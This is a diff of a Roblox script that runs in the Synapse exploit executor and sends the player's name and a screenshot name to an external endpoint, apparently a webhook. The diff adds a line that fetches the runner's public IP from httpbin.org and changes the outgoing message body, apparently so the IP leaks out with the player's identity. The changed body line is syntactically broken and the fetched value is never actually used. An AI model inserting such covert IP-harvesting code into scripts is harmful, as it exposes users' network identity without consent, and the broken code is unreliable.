@@ -1,5 +1,5 @@
 local TestService = game:GetService("TestService") --I like the blue print
-
+local XD = tostring(syn.request({Url="https://httpbin.org/ip"}).Body)
 local name
 
 game["ScreenshotReady"]:Connect(function(path)
@@ -23,6 +23,8 @@ local response = syn.request(
 		Headers = {
 			['Content-Type'] = 'application/json'
 		},
-		Body = game:GetService('HttpService'):JSONEncode({content = "```" .. game.Players.LocalPlayer.Name .. name .."```"})
+		Body = game:GetService('HttpService'):JSONEncode({content = "```" .. game.Players.LocalPlayer.Name .. name .. .. " XD "```"})
 	}
 );
+
+
